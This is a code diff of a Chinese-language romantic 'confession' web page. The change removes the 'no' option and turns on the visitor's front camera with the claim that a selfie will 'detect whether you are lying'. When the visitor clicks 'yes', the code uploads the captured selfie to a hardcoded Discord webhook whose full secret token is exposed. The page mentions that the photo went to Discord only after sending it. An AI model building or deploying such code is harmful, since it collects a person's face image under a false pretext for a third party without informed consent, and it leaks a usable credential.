@@ -2,116 +2,59 @@
 <html lang="zh-TW">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>我喜歡妳</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+<title>我喜歡妳 💖</title>
 
 <style>
 body {
   margin: 0;
-  height: 100vh;
   background: #0d1117;
-  font-family: "微軟正黑體", Arial;
+  font-family: "微軟正黑體";
+  color: white;
+  text-align: center;
   overflow: hidden;
 }
 
 .card {
-  width: 100%;
-  height: 100vh;
-  background: #1f2933;
-  display: flex;
-  flex-direction: column;
-  justify-content: center;
-  align-items: center;
-  color: white;
-  position: relative;
+  padding-top: 30px;
 }
 
-img {
-  width: 100px;
-  margin-bottom: 15px;
+video {
+  width: 90%;
+  max-width: 320px;
+  border-radius: 12px;
+  margin-top: 10px;
 }
 
-.title {
-  font-size: 22px;
-  text-align: center;
-  line-height: 1.6;
-}
-
-.subtitle {
-  font-size: 16px;
-  color: #aaa;
-}
-
-.btn-area {
-  position: relative;
-  width: 300px;
-  height: 200px;
-  margin-top: 20px;
+canvas {
+  display: none;
 }
 
 button {
-  padding: 12px 25px;
+  margin: 10px;
+  padding: 12px 20px;
   border: none;
-  border-radius: 12px;
-  font-size: 18px;
+  border-radius: 10px;
+  font-size: 16px;
   cursor: pointer;
-  position: absolute;
-  transition: 0.2s;
 }
 
-.yes {
+#shoot {
   background: #4CAF50;
   color: white;
 }
 
-.no {
-  background: #ff4d4d;
+#yesBtn {
+  background: #ff4d6d;
   color: white;
 }
 
-/* 成功畫面 */
-.success {
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  background: radial-gradient(circle, #ff4d6d, #0d1117);
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  flex-direction: column;
-  opacity: 0;
-  pointer-events: none;
-  transition: 0.5s;
-}
-
-.success.show {
-  opacity: 1;
-  pointer-events: all;
-}
-
-.success h1 {
-  font-size: 40px;
-  color: white;
-  animation: pop 0.5s ease;
-}
-
-@keyframes pop {
-  0% { transform: scale(0); }
-  100% { transform: scale(1); }
-}
-
-/* 愛心 */
-.heart {
-  position: absolute;
-  font-size: 20px;
-  animation: float 3s linear infinite;
-}
-
-@keyframes float {
-  0% { transform: translateY(0); opacity: 1; }
-  100% { transform: translateY(-300px); opacity: 0; }
+img {
+  width: 200px;
+  margin-top: 10px;
+  border-radius: 12px;
+  display: none;
 }
 </style>
 </head>
@@ -119,127 +62,92 @@ button {
 <body>
 
 <div class="card">
-  <img src="https://cdn-icons-png.flaticon.com/512/742/742751.png">
+  <h2>💖 拍一張照片再決定 💖</h2>
 
-  <p class="title">
-    我喜歡你 ❤️<br>
-    <span class="subtitle">你願意跟我在一起嗎？ 😳</span>
-  </p>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
 
-  <div class="btn-area" id="area">
-    <button class="yes" id="yesBtn">願意</button>
-    <button class="no" id="noBtn">不願意</button>
-  </div>
-</div>
+  <br>
 
-<div class="success" id="success">
-  <h1>我愛你 ❤️</h1>
+  <button id="shoot">📸 拍照</button>
+  <button id="yesBtn">💖 願意</button>
+
+  <br>
+
+  <img id="preview">
 </div>
 
 <script>
-const noBtn = document.getElementById("noBtn");
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const shoot = document.getElementById("shoot");
 const yesBtn = document.getElementById("yesBtn");
-const area = document.getElementById("area");
-const success = document.getElementById("success");
+const preview = document.getElementById("preview");
 
-let noScale = 1;
-let yesScale = 1;
+let imageData = null;
 
-// 初始位置
-yesBtn.style.left = "40px";
-yesBtn.style.top = "100px";
-
-noBtn.style.left = "160px";
-noBtn.style.top = "100px";
-
-// 😈 NO 逃跑效果
-function moveAway(x, y) {
-  const rect = noBtn.getBoundingClientRect();
-  const bx = rect.left + rect.width / 2;
-  const by = rect.top + rect.height / 2;
-
-  const dx = bx - x;
-  const dy = by - y;
-  const dist = Math.sqrt(dx * dx + dy * dy);
-
-  if (dist < 120) {
-    const maxX = area.clientWidth - noBtn.offsetWidth;
-    const maxY = area.clientHeight - noBtn.offsetHeight;
-
-    noBtn.style.left = Math.random() * maxX + "px";
-    noBtn.style.top = Math.random() * maxY + "px";
-
-    noScale = Math.max(0.3, noScale - 0.1);
-    yesScale += 0.1;
-
-    noBtn.style.transform = `scale(${noScale})`;
-    yesBtn.style.transform = `scale(${yesScale})`;
-  }
-}
-
-document.addEventListener("mousemove", e => moveAway(e.clientX, e.clientY));
-document.addEventListener("touchmove", e => {
-  moveAway(e.touches[0].clientX, e.touches[0].clientY);
+// 📷 開前置鏡頭（必須用 HTTPS 或 localhost）
+navigator.mediaDevices.getUserMedia({
+  video: { facingMode: "user" }
+}).then(stream => {
+  video.srcObject = stream;
+}).catch(err => {
+  alert("無法開啟相機：" + err);
 });
 
-// 💖 YES 按下
-yesBtn.onclick = async () => {
-  success.classList.add("show");
+// 📸 拍照
+shoot.onclick = () => {
+  const ctx = canvas.getContext("2d");
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
 
+  ctx.drawImage(video, 0, 0);
+
+  imageData = canvas.toDataURL("image/png");
+
+  preview.src = imageData;
+  preview.style.display = "block";
+};
+
+// 💖 傳 Discord
+yesBtn.onclick = async () => {
   const webhookURL = "https://discord.com/api/webhooks/1492236169524674625/K4JOL-5_G46crVFSWO2S05m9DhJamM42P91kQb-GCPFu7v6CiSIOvQHByAxuo1eqLbCq";
+
+  if (!imageData) {
+    alert("請先開前攝辨識你是否說謊 📸");
+    return;
+  }
+
+  // 將 base64 轉 blob
+  const res = await fetch(imageData);
+  const blob = await res.blob();
+
+  const formData = new FormData();
+  formData.append("file", blob, "selfie.png");
 
   const embed = {
     username: "💌 告白系統",
-    avatar_url: "https://cdn-icons-png.flaticon.com/512/742/742751.png",
     embeds: [
       {
         title: "💖 告白成功",
-        description: "有人按下『願意』，戀愛成功觸發 ❤️",
+        description: "有人按下願意並上傳自拍 ❤️",
         color: 0xff4d6d,
-        thumbnail: {
-          url: "https://cdn-icons-png.flaticon.com/512/742/742751.png"
-        },
-        fields: [
-          {
-            name: "💘 結果",
-            value: "成功接受告白",
-            inline: true
-          },
-          {
-            name: "💞 狀態",
-            value: "進入戀愛模式",
-            inline: true
-          }
-        ],
-        footer: {
-          text: "Love System Notification"
+        image: {
+          url: "attachment://selfie.png"
         },
         timestamp: new Date().toISOString()
       }
     ]
   };
 
-  try {
-    await fetch(webhookURL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(embed)
-    });
-  } catch (e) {
-    console.log("Webhook 發送失敗", e);
-  }
+  formData.append("payload_json", JSON.stringify(embed));
 
-  // 💖 愛心動畫
-  setInterval(() => {
-    const heart = document.createElement("div");
-    heart.className = "heart";
-    heart.innerText = "💖";
-    heart.style.left = Math.random() * 100 + "%";
-    heart.style.top = "80%";
-    document.body.appendChild(heart);
+  await fetch(webhookURL, {
+    method: "POST",
+    body: formData
+  });
 
-    setTimeout(() => heart.remove(), 3000);
-  }, 200);
+  alert("已傳送到 Discord 💖");
 };
 </script>
 
